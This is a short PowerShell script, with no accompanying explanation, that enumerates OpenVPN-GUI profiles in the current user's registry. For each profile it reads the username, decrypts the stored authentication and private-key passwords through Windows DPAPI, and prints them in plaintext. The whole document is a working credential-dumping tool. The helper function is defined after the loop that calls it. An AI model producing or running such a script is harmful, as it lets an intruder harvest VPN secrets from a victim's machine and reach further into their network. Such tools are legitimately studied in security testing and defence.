Add-Type -AssemblyName System.Security

$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
    $profilename = $item.PSChildName
    $username = [System.Text.Encoding]::Unicode.GetString($item.username)
    $cu = [System.Security.Cryptography.DataProtectionScope]::CurrentUser

    $entropy=$item.'entropy'
    $entropy=$entropy[0..(($entropy.Length)-2)]

    $authpwd = Decrypt-Data $item.'auth-data' $entropy $cu
    $privpwd = Decrypt-Data $item.'key-data' $entropy $cu

    Write-Output("-" * 40)
    Write-Output("Profile: $profilename")
    Write-Output("Username: $username")
    Write-Output("Auth PWD: $authpwd")
    Write-Output("Priv PWD: $privpwd")
    Write-Output("-" * 40)
}

function Decrypt-Data {
    param($encryptedData, $entropy, $cu)

    if ($encryptedData -is [string]) {
        $encryptedData = $encryptedData -split ' ' | ForEach-Object {[byte]$_}
    }

    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
        $encryptedData,
        $entropy,
        $cu
    )
    return [System.Text.Encoding]::Unicode.GetString($decrypted)
}
